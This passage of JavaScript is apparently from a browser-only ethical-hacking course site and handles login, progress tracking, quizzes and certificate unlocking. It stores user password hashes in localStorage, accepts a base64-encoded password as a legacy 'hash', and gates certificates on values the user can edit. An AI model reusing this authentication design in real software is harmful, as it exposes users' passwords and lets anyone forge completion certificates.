    startOTPTimer(_otpState.expiresAt);
    okEl.textContent = '// New code sent ‚Äî check your email';
  } catch(err) {
    errEl.textContent = '// Failed to resend ‚Äî please try again';
    resendBtn.disabled = false;
  }
}

// ‚îÄ‚îÄ CANCEL OTP ‚îÄ‚îÄ
function cancelOTP() {
  _otpState = null;
  stopOTPTimer();
  clearOTPInputs();
  switchAuthTab('register');
}

// ‚îÄ‚îÄ LOGIN ‚îÄ‚îÄ
async function doLogin() {
  const email  = document.getElementById('l-email').value.trim().toLowerCase();
  const pass   = document.getElementById('l-pass').value;
  const errEl  = document.getElementById('l-err');
  errEl.textContent = '';

  if (!email || !pass) return errEl.textContent = '// Email and password required';

  const users = getUsers();
  const user  = users[email];
  if (!user)          return errEl.textContent = '// No account found ‚Äî please register';
  if (!user.verified) return errEl.textContent = '// Email not verified ‚Äî please complete registration';

  // Support both old btoa hash and new SHA-256 hash
  const newHash = await sha256(pass + email + 'hp_v2_2024');
  const oldHash = btoa(pass + ':hp2024salt:' + email);

  if (user.password !== newHash && user.password !== oldHash) {
    return errEl.textContent = '// Incorrect password';
  }

  // Upgrade old hash to new hash silently
  if (user.password === oldHash) {
    users[email].password = newHash;
    saveUsers(users);
  }

  loginUser(user);
}

// ‚îÄ‚îÄ LOGIN USER (shared) ‚îÄ‚îÄ
function loginUser(user) {
  // Re-fetch from storage in case verifyOTP just saved
  const users = getUsers();
  const u = users[user.email] || user;

  setCurrentUser({ name: u.name, email: u.email });

  ST.xp         = u.xp         || 0;
  ST.completed  = u.completed  || [];
  ST.lessonDone = u.lessonDone || {};

  document.getElementById('nav-user-badge').style.display = 'flex';
  document.getElementById('nav-links-main').style.display = 'flex';
  const initials = u.name.split(' ').map(w => w[0]).join('').substring(0,2).toUpperCase();
  document.getElementById('nav-avatar').textContent = initials;
  document.getElementById('nav-username-disp').textContent = u.name.split(' ')[0];

  document.getElementById('view-auth').style.display = 'none';
  document.getElementById('view-landing').style.display = 'none';
  document.querySelector('nav').style.display = 'flex';
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  document.getElementById('view-home').classList.add('active');
  renderHome();
}

// ‚îÄ‚îÄ LOGOUT ‚îÄ‚îÄ
function doLogout() {
  saveProgressToAccount();
  clearCurrentUser();
  _otpState = null;
  stopOTPTimer();
  ST.xp = 0; ST.completed = []; ST.lessonDone = {};
  document.getElementById('nav-user-badge').style.display = 'none';
  document.querySelector('nav').style.display = 'none';
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  document.getElementById('view-auth').style.display = 'none';
  showLanding();
  ['l-email','l-pass','r-name','r-email','r-pass','r-pass2'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.value = '';
  });
  checkStrength('');
  switchAuthTab('login');
}

// ‚îÄ‚îÄ SAVE PROGRESS ‚îÄ‚îÄ
function saveProgressToAccount() {
  const cu = getCurrentUser();
  if (!cu) return;
  const users = getUsers();
  if (!users[cu.email]) return;
  users[cu.email].xp             = ST.xp;
  users[cu.email].completed      = ST.completed;
  users[cu.email].lessonDone     = ST.lessonDone;
  users[cu.email].finalExamScore = ST.finalExamScore;
  users[cu.email].certUnlocked   = ST.certUnlocked;
  saveUsers(users);
}

// ‚îÄ‚îÄ AUTO-FILL CERTIFICATE ‚îÄ‚îÄ
function autoFillCert() {
  const cu = getCurrentUser();
  if (!cu) return;
  const today   = new Date().toISOString().split('T')[0];
  const dateStr = new Date(today + 'T12:00:00').toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
  const certId  = 'HP-' + btoa(cu.email).replace(/[^A-Z0-9]/gi,'').substring(0,8).toUpperCase();
  const vals    = { 'disp-name':cu.name,'cert-name-display':cu.name,'disp-date':dateStr,'cert-date-display':dateStr,'disp-id':certId,'cert-id-display':'CERTIFICATE ID: '+certId,'foot-id':'Certificate ID: '+certId };
  for (const [id,val] of Object.entries(vals)) { const el=document.getElementById(id); if(el) el.textContent=val; }
  const banner = document.getElementById('cert-user-name-banner');
  const emailB = document.getElementById('cert-user-email-banner');
  if (banner) banner.textContent = cu.name;
  if (emailB) emailB.textContent = cu.email;
}


// Enter key support + OTP input wiring
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('l-pass').addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });
  document.getElementById('l-email').addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });
  document.getElementById('r-pass2').addEventListener('keydown', e => { if(e.key==='Enter') doRegister(); });
  initOTPInputs();
  // Set today's date in cert date input
  const cdEl = document.getElementById('cd');
  if (cdEl && !cdEl.value) cdEl.value = new Date().toISOString().split('T')[0];
});

// =================== STATE ===================
const ST = {
  completed: JSON.parse(localStorage.getItem('hp_done') || '[]'),
  finalExamScore: parseInt(localStorage.getItem('hp_exam_score') || '-1'),
  certUnlocked: localStorage.getItem('hp_cert_unlocked') === '1',
  xp: parseInt(localStorage.getItem('hp_xp') || '0'),
  lessonDone: JSON.parse(localStorage.getItem('hp_ldone') || '{}'),
  ch: 0,
  ls: 0
};

function save(){
  localStorage.setItem('hp_done', JSON.stringify(ST.completed));
  localStorage.setItem('hp_xp', ST.xp);
  localStorage.setItem('hp_ldone', JSON.stringify(ST.lessonDone));
  localStorage.setItem('hp_exam_score', ST.finalExamScore);
  if (ST.certUnlocked) localStorage.setItem('hp_cert_unlocked', '1');
  saveProgressToAccount();
}

// =================== VIEWS ===================
function showView(name){
  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
  document.getElementById('view-'+name).classList.add('active');
  if(name==='home') renderHome();
  if(name==='lesson') renderLesson();
  if(name==='quiz') { document.getElementById('qe-num') && (document.getElementById('qe-num').textContent='FINAL EXAM'); startGlobalQuiz(); }
  if(name==='cert') { showCertView(); }
}

// =================== HOME ===================
function renderHome(){
  document.getElementById('xp-disp').textContent = ST.xp;
  const pct = Math.round(ST.completed.length/CHAPTERS.length*100);
  document.getElementById('ob').style.width = pct+'%';
  document.getElementById('opn').textContent = pct+'%';
  document.getElementById('pl').textContent = ST.completed.length+' / '+CHAPTERS.length+' MODULES';
  document.getElementById('mgrid').innerHTML = CHAPTERS.map(ch=>{
    const done = ST.completed.includes(ch.num);
    const prog = done ? 100 : 0;
    return `<div class="mc ${done?'done':''}" onclick="openChapter(${ch.num-1})">
      <div class="mh"><div class="mn">MODULE ${String(ch.num).padStart(2,'0')}</div><div class="mbadge ${done?'bd':'bl'}">${done?'DONE':'LIVE'}</div></div>
      <div class="mi">${ch.icon}</div>
      <div class="mt">${ch.title}</div>
      <div class="md">${ch.desc}</div>
      <div class="mm"><span>‚ö° ${ch.xp} XP</span><span>üìñ ${ch.lessons.length} LESSONS</span>${done?'<span style="color:var(--green)">‚úì COMPLETE</span>':''}</div>
      <div class="mprog"><div class="mpf" style="width:${prog}%"></div></div>
    </div>`;
  }).join('');
}


// =================== SIDEBAR MOBILE ===================
function openSidebar(){
  document.getElementById('lsb').classList.add('open');
  document.getElementById('sb-overlay').classList.add('show');
  document.body.style.overflow='hidden';
}
function closeSidebar(){
  document.getElementById('lsb').classList.remove('open');
  document.getElementById('sb-overlay').classList.remove('show');
  document.body.style.overflow='';
}

// =================== LESSON ===================
function openChapter(idx){
  ST.ch = idx; ST.ls = 0;
  showView('lesson');
}

function renderLesson(){
  renderSidebar();
  renderLessonContent();
}

function renderSidebar(){
  document.getElementById('sb-chapters').innerHTML = CHAPTERS.map((ch,ci)=>{
    const isOpen = ci===ST.ch;
    const done = ST.completed.includes(ch.num);
    return `<div class="sch">
      <button class="sct ${isOpen?'act':''}" onclick="toggleCh(${ci})">
        ${ch.icon} ${String(ch.num).padStart(2,'0')}. ${ch.title.substring(0,20)}... ${done?'‚úì':''}
        <span>${isOpen?'‚ñ≤':'‚ñº'}</span>
      </button>
      <div class="sls ${isOpen?'open':''}" id="sl-${ci}">
        ${ch.lessons.map((l,li)=>{
          const lkey = `${ci}-${li}`;
          const ldone = ST.lessonDone[lkey];
          return `<button class="sl-item ${ldone?'done-l':''} ${ci===ST.ch&&li===ST.ls?'act':''}" onclick="selectLesson(${ci},${li})">${l.name}</button>`;
        }).join('')}
        <button class="sl-item ${ci===ST.ch&&ST.ls===999?'act':''}" onclick="selectLesson(${ci},999)" style="color:var(--orange)">üìù Chapter Quiz</button>
      </div>
    </div>`;
  }).join('');
}

function toggleCh(ci){
  ST.ch = ci; ST.ls = 0;
  renderLesson();
}

function selectLesson(ci, li){
  ST.ch = ci; ST.ls = li;
  renderSidebar();
  renderLessonContent();
  document.querySelector('.lmain').scrollTop = 0;
  closeSidebar();
}

function renderLessonContent(){
  const ch = CHAPTERS[ST.ch];
  const lc = document.getElementById('lesson-content');
  if(!ch){ lc.innerHTML='<p style="color:var(--dim)">Select a chapter to begin.</p>'; return; }

  if(ST.ls === 999){
    renderChapterQuiz(ch);
    return;
  }

  // KEY FIX: each lesson has its own content object
  const lesson = ch.lessons[ST.ls];
  if(!lesson){ lc.innerHTML='<p style="color:var(--dim)">Lesson not found.</p>'; return; }

  const isLast = ST.ls >= ch.lessons.length - 1;

  lc.innerHTML = `
    <div class="lbread">MODULE ${String(ch.num).padStart(2,'0')} <span>/</span> ${ch.title} <span>/</span> ${lesson.name}</div>
    <div class="ltitle">${ch.title}</div>
    <div class="lsub">// ${lesson.name}</div>
    <div class="lb">${lesson.content}</div>
    <div class="lfooter">
      <button class="btn-s" onclick="prevLesson()">‚Üê BACK</button>
      <div class="lprog">LESSON ${ST.ls+1} OF ${ch.lessons.length}</div>
      ${isLast
        ? `<button class="btn-p" onclick="selectLesson(${ST.ch},999)">TAKE QUIZ ‚Üí</button>`
        : `<button class="btn-p" onclick="nextLesson()">NEXT LESSON ‚Üí</button>`
      }
    </div>`;

  // Update topbar title
  const titleEl = document.getElementById('lmain-title');
  if(titleEl) titleEl.textContent = lesson ? lesson.name : '';

  // Append interactive terminal at the bottom of every lesson
  const lca = document.getElementById('lesson-content');
  const termId = 'l' + ST.ch + '_' + ST.ls + '_' + Date.now();
  const termDiv = document.createElement('div');
  termDiv.innerHTML = '<div style="margin-top:2rem;border-top:1px solid var(--border);padding-top:2rem"><div style="font-family:var(--mono);font-size:.62rem;color:var(--cyan);letter-spacing:3px;text-transform:uppercase;margin-bottom:.8rem">// PRACTICE TERMINAL ‚Äî TRY IT YOURSELF</div>' + makeInteractiveTerm(termId) + '</div>';
  lca.appendChild(termDiv);
  setTimeout(initInteractiveTerms, 50);

  // Mark lesson as done
  const lkey = `${ST.ch}-${ST.ls}`;
  if(!ST.lessonDone[lkey]){ ST.lessonDone[lkey]=true; save(); }
}

function nextLesson(){
  if(ST.ls < CHAPTERS[ST.ch].lessons.length - 1){
    ST.ls++;
    renderSidebar();
    renderLessonContent();
    document.querySelector('.lmain').scrollTop = 0;
  }
}

function prevLesson(){
  if(ST.ls > 0){
    ST.ls--;
  } else if(ST.ch > 0){
    ST.ch--;
    ST.ls = CHAPTERS[ST.ch].lessons.length - 1;
  }
  renderSidebar();
  renderLessonContent();
  document.querySelector('.lmain').scrollTop = 0;
}

// =================== CHAPTER QUIZ ===================
function renderChapterQuiz(ch){
  const lc = document.getElementById('lesson-content');
  lc.innerHTML = `
    <div class="lbread">MODULE ${String(ch.num).padStart(2,'0')} <span>/</span> CHAPTER QUIZ</div>
    <div class="ltitle">${ch.title}</div>
    <div class="lsub">// Knowledge Check ‚Äî ${ch.quiz.length} Questions</div>
    <div class="lb">
      ${ch.quiz.map((q,qi)=>`
        <div class="qc" style="margin-bottom:1.5rem">
          <div class="qh">// QUESTION ${qi+1}</div>
          <div class="qq">${q.q}</div>
          <div class="qopts" id="cqo-${qi}">
            ${q.opts.map((o,oi)=>`<button class="qo" onclick="answerChQ(${qi},${oi},${q.ans})"><span class="ol">${String.fromCharCode(65+oi)}</span>${o}</button>`).join('')}
          </div>
        </div>`).join('')}
    </div>
    <div class="lfooter">
      <button class="btn-s" onclick="selectLesson(${ST.ch},${ch.lessons.length-1})">‚Üê BACK</button>
      <div id="quiz-result" style="font-family:var(--mono);font-size:.7rem;color:var(--dim)"></div>
      <button class="btn-p" id="complete-btn" onclick="completeChapter(${ch.num})" style="display:none">‚úì COMPLETE MODULE +${ch.xp}XP</button>
    </div>`;
}

let chQuizAnswered = {};
function answerChQ(qi, oi, correct){
  if(chQuizAnswered[qi]) return;
  chQuizAnswered[qi] = true;
  document.querySelectorAll(`#cqo-${qi} .qo`).forEach((b,i)=>{
    b.disabled=true;
    if(i===correct) b.classList.add('correct');
    else if(i===oi) b.classList.add('wrong');
  });
  const ch = CHAPTERS[ST.ch];
  if(Object.keys(chQuizAnswered).length >= ch.quiz.length){
    chQuizAnswered = {};
    document.getElementById('complete-btn').style.display='inline-block';
  }
}

function completeChapter(num){
  if(!ST.completed.includes(num)){
    ST.completed.push(num);
    ST.xp += CHAPTERS[num-1].xp;
    save();
    document.getElementById('xp-disp').textContent = ST.xp;
  }
  if(ST.ch < CHAPTERS.length-1){
    ST.ch++; ST.ls=0;
    renderLesson();
  } else {
    showView('home');
    setTimeout(()=>alert('üèÜ All 17 modules complete! Claim your certificate in the PRO section!'),300);
  }
}

// =================== GLOBAL QUIZ ===================
let gqState = {idx:0, correct:0, answered:false};
function startGlobalQuiz(){
  gqState={idx:0,correct:0,answered:false};
  renderGQ();
}
function renderGQ(){
  const total = GLOBAL_QUIZ.length;
  if(gqState.idx>=total){ showGQResult(); return; }
  const q = GLOBAL_QUIZ[gqState.idx];
  document.getElementById('qe-num').textContent = `QUESTION ${gqState.idx+1} OF ${total}`;
  document.getElementById('qe-bar').style.width = ((gqState.idx+1)/total*100)+'%';
  document.getElementById('qe-body').innerHTML = `
    <div class="qeq">${q.q}</div>
    <div class="qopts">${q.opts.map((o,oi)=>`<button class="qo" onclick="answerGQ(${oi},${q.ans})"><span class="ol">${String.fromCharCode(65+oi)}</span>${o}</button>`).join('')}</div>`;
}
function answerGQ(oi, correct){
  if(gqState.answered) return;
  gqState.answered=true;
  if(oi===correct) gqState.correct++;
  document.querySelectorAll('.qo').forEach((b,i)=>{
    b.disabled=true;
    if(i===correct) b.classList.add('correct');
    else if(i===oi) b.classList.add('wrong');
  });
  setTimeout(()=>{ gqState.idx++; gqState.answered=false; renderGQ(); }, 1300);
}
function showGQResult(){
  const pct    = Math.round(gqState.correct/GLOBAL_QUIZ.length*100);
  const xpE    = gqState.correct*5;
  const passed = pct >= 80;
  const allModules = ST.completed.length >= CHAPTERS.length;

  // Save exam score to state
  ST.finalExamScore = pct;
  ST.xp += xpE;

  // Unlock cert if both conditions met
  if (passed && allModules && !ST.certUnlocked) {
    ST.certUnlocked = true;
  }
  save();
  document.getElementById('xp-disp').textContent = ST.xp;

  const certBtn = passed && allModules
    ? `<button class="btn-p" onclick="showView('cert')" style="margin-top:1.2rem">üèÜ CLAIM YOUR CERTIFICATE ‚Üí</button>`
    : passed && !allModules
    ? `<div style="margin-top:1rem;background:rgba(255,140,0,.07);border:1px solid rgba(255,140,0,.2);padding:.8rem 1.2rem;font-family:var(--mono);font-size:.68rem;color:var(--orange);letter-spacing:.5px">
        ‚ö†Ô∏è Complete all ${CHAPTERS.length} modules to unlock your certificate<br>
        <span style="color:var(--dim)">${ST.completed.length} / ${CHAPTERS.length} modules done</span>
       </div>`
    : `<div style="margin-top:1rem;background:rgba(255,51,102,.06);border:1px solid rgba(255,51,102,.15);padding:.8rem 1.2rem;font-family:var(--mono);font-size:.68rem;color:var(--red);letter-spacing:.5px">
        ‚úó 80% required to pass ‚Äî you scored ${pct}%. Retake to unlock your certificate.
       </div>`;

  document.getElementById('qe-body').innerHTML=`
    <div style="text-align:center;padding:2rem 1rem">
      <div style="font-family:var(--mono);font-size:.62rem;color:var(--dim);letter-spacing:3px;text-transform:uppercase;margin-bottom:.6rem">FINAL EXAM RESULT</div>
      <div style="font-family:var(--disp);font-size:3.5rem;font-weight:900;color:${passed?'var(--green)':'var(--red)'};margin-bottom:.3rem;line-height:1">${pct}%</div>
      <div style="font-family:var(--mono);color:var(--dim);margin-bottom:.8rem;font-size:.75rem;letter-spacing:1px">${gqState.correct} / ${GLOBAL_QUIZ.length} CORRECT</div>
      <div style="background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.2);display:inline-block;padding:.25rem 1rem;font-family:var(--mono);font-size:.7rem;color:var(--yellow);margin-bottom:1rem">+${xpE} XP EARNED</div>
      <div style="font-family:var(--mono);font-size:.78rem;color:${passed?'var(--green)':'var(--dim)'};margin-bottom:.5rem">
        ${passed ? '‚úì PASSED ‚Äî 80% THRESHOLD MET' : '‚úó NOT PASSED ‚Äî 80% REQUIRED TO PASS'}
      </div>
      ${certBtn}
      <div style="margin-top:1.5rem;display:flex;gap:.8rem;justify-content:center;flex-wrap:wrap">
        <button class="btn-s" onclick="startGlobalQuiz()">RETAKE EXAM</button>
        ${!passed ? '' : `<button class="btn-s" onclick="showView('lesson')">REVIEW LESSONS</button>`}
      </div>
    </div>`;
}


// =================== CERTIFICATE GATE ===================
function showCertView() {
  const cu          = getCurrentUser();
  const totalMods   = CHAPTERS.length;
  const doneMods    = ST.completed.length;
  const examScore   = ST.finalExamScore; // -1 = never taken
  const allDone     = doneMods >= totalMods;
  const examPassed  = examScore >= 80;
  const unlocked    = ST.certUnlocked || (allDone && examPassed);

  // Persist if newly unlocked
  if (unlocked && !ST.certUnlocked) {
    ST.certUnlocked = true;
    save();
  }

  const gate = document.getElementById('cert-gate-section');
  if (!gate) return;

  if (unlocked) {
    // ‚îÄ‚îÄ UNLOCKED: show generate UI ‚îÄ‚îÄ
    const name = cu ? cu.name : '‚Äî';
    gate.innerHTML = `
      <div style="background:linear-gradient(135deg,rgba(0,255,136,.08),rgba(0,212,255,.04));border:1px solid rgba(0,255,136,.25);padding:1.4rem 1.6rem;margin-bottom:1.6rem;display:flex;align-items:center;gap:1.2rem;flex-wrap:wrap">
        <div style="font-size:2.2rem">üèÜ</div>
        <div>
          <div style="font-family:var(--mono);font-size:.62rem;color:var(--green);letter-spacing:3px;margin-bottom:.3rem">CERTIFICATE UNLOCKED</div>
          <div style="font-family:var(--disp);font-size:1.15rem;color:var(--bright);font-weight:900">${escHtml(name)}</div>
          <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);margin-top:.2rem">
            ‚úì All ${totalMods} modules completed &nbsp;¬∑&nbsp; ‚úì Final exam: ${examScore}%
          </div>
        </div>
      </div>
      <div class="cft">// GENERATE YOUR CERTIFICATE</div>
      <div class="fi2g" style="margin-bottom:1.2rem">
        <div class="fg">
          <label class="fl">Specialization Track</label>
          <select class="fi" id="ctrack" onchange="renderCertPreview()">
            <option>Linux Fundamentals &amp; Ethical Hacking</option>
            <option>Network Penetration Testing</option>
            <option>Kali Linux Mastery</option>
            <option>Offensive Security Foundations</option>
          </select>
        </div>
        <div class="fg">
          <label class="fl">Completion Date</label>
          <input type="date" class="fi" id="cd" onchange="renderCertPreview()" />
        </div>
      </div>
      <div style="display:flex;gap:.8rem;flex-wrap:wrap">
        <button class="btn-p" onclick="renderCertPreview()">üìú GENERATE CERTIFICATE</button>
        <button class="btn-s" onclick="window.print()">üñ® PRINT / SAVE PDF</button>
      </div>`;

    // Set today's date
    const cdEl = document.getElementById('cd');
    if (cdEl && !cdEl.value) cdEl.value = new Date().toISOString().split('T')[0];
    autoFillCert();
    renderCertPreview();

  } else {
    // ‚îÄ‚îÄ LOCKED: show requirements checklist ‚îÄ‚îÄ
    const modBar  = Math.round(doneMods / totalMods * 100);
    const examBar = examScore >= 0 ? examScore : 0;
    const examTxt = examScore >= 0 ? `${examScore}% (need 80%)` : 'Not attempted yet';
    const examCol = examScore >= 80 ? 'var(--green)' : examScore >= 0 ? 'var(--red)' : 'var(--dim)';

    gate.innerHTML = `
      <div style="background:rgba(255,140,0,.05);border:1px solid rgba(255,140,0,.2);border-left:3px solid var(--orange);padding:1.4rem 1.6rem;margin-bottom:1.6rem">
        <div style="font-family:var(--mono);font-size:.65rem;color:var(--orange);letter-spacing:3px;margin-bottom:.5rem">üîí CERTIFICATE LOCKED</div>
        <div style="font-size:.88rem;color:var(--dim);margin-bottom:1.4rem">Complete both requirements below to unlock your certificate of completion.</div>

        <div style="margin-bottom:1.2rem">
          <div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:.65rem;margin-bottom:.4rem">
            <span style="color:${allDone ? 'var(--green)' : 'var(--bright)'}">
              ${allDone ? '‚úì' : '‚óã'} COMPLETE ALL MODULES
            </span>
            <span style="color:${allDone ? 'var(--green)' : 'var(--dim)'}">
              ${doneMods} / ${totalMods}
            </span>
          </div>
          <div style="height:6px;background:var(--border);border-radius:3px;overflow:hidden">
            <div style="height:100%;width:${modBar}%;background:${allDone ? 'var(--green)' : 'var(--cyan)'};transition:width .4s"></div>
          </div>
        </div>

        <div style="margin-bottom:1.4rem">
          <div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:.65rem;margin-bottom:.4rem">
            <span style="color:${examPassed ? 'var(--green)' : 'var(--bright)'}">
              ${examPassed ? '‚úì' : '‚óã'} PASS FINAL EXAM WITH 80%+
            </span>
            <span style="color:${examCol}">${examTxt}</span>
          </div>
          <div style="height:6px;background:var(--border);border-radius:3px;overflow:hidden">
            <div style="height:100%;width:${examBar}%;background:${examPassed ? 'var(--green)' : examScore >= 0 ? 'var(--red)' : 'var(--border)'};transition:width .4s"></div>
          </div>
        </div>

        <div style="display:flex;gap:.8rem;flex-wrap:wrap">
          ${!allDone ? `<button class="btn-p" onclick="showView('lesson')">‚Üí CONTINUE LESSONS</button>` : ''}
          <button class="${allDone ? 'btn-p' : 'btn-s'}" onclick="showView('quiz')">
            ${examScore >= 0 && !examPassed ? 'üîÑ RETAKE FINAL EXAM' : '‚Üí TAKE FINAL EXAM'}
          </button>
        </div>
      </div>`;

    // Hide the certificate preview
    const preview = document.getElementById('cert-preview');
    if (preview) preview.classList.remove('visible');
  }
}

// =================== CERTIFICATE ===================
function renderCertPreview() {
  const cu = getCurrentUser();
  const name = cu ? cu.name : 'Your Full Name';
  const track = (document.getElementById('ctrack') || {}).value || 'Linux Fundamentals & Ethical Hacking';
  const dateVal = (document.getElementById('cd') || {}).value;
  const date = dateVal
    ? new Date(dateVal + 'T12:00:00').toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'})
    : new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
  const certId = cu ? 'HP-' + btoa(cu.email).replace(/[^A-Z0-9]/gi,'').substring(0,8).toUpperCase() : 'HP-PREVIEW';

  // Update cert display elements
  const els = {
    'disp-name': name,
    'cert-name-display': name,
    'disp-date': date,
    'cert-date-display': date,
    'disp-track': track,
    'cert-track-display': track,
    'disp-id': certId,
    'cert-id-display': 'CERTIFICATE ID: ' + certId,
    'foot-id': 'Certificate ID: ' + certId,
  };
  for (const [id, val] of Object.entries(els)) {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
  }

  // Update banner
  const banner = document.getElementById('cert-user-name-banner');
  const emailBanner = document.getElementById('cert-user-email-banner');
  if (banner) banner.textContent = name;
  if (emailBanner) emailBanner.textContent = cu ? cu.email : 'Sign in to auto-generate';

  // Show certificate
  const preview = document.getElementById('cert-preview');
  if (preview) {
    preview.classList.add('visible');
    preview.scrollIntoView({behavior:'smooth', block:'start'});
  }
}

// Legacy alias
function generateCert() { renderCertPreview(); }

// =================== CLOCK ===================
setInterval(()=>{
  const el=document.getElementById('clock');
  if(el) el.textContent=new Date().toUTCString().split(' ')[4]+' UTC';
},1000);

// =================== INIT ===================
(function initApp() {
  const cu = getCurrentUser();
  if (cu) {
    // Already logged in ‚Äî restore progress and go to home
    const users = getUsers();
    const u = users[cu.email];
    if (u) {
      ST.xp         = u.xp         || 0;
      ST.completed  = u.completed  || [];
      ST.lessonDone = u.lessonDone || {};
    }
    // Show nav, hide auth
    document.getElementById('view-auth').style.display = 'none';
    document.querySelector('nav').style.display = 'flex';
    document.getElementById('view-home').classList.add('active');
    document.getElementById('nav-user-badge').style.display = 'flex';
    const initials = cu.name.split(' ').map(w=>w[0]).join('').substring(0,2).toUpperCase();
    document.getElementById('nav-avatar').textContent = initials;
    document.getElementById('nav-username-disp').textContent = cu.name.split(' ')[0];
    renderHome();
  } else {
    // Not logged in ‚Äî show landing page first
    document.querySelector('nav').style.display = 'none';
    document.querySelectorAll('.view').forEach(v => { v.classList.remove('active'); });
    document.getElementById('view-auth').style.display = 'none';
    // Set today's date in the cert date input
    const cdEl = document.getElementById('cd');
    if (cdEl) cdEl.value = new Date().toISOString().split('T')[0];
    showLanding();
  }
})();
</script>
</body>
</html>
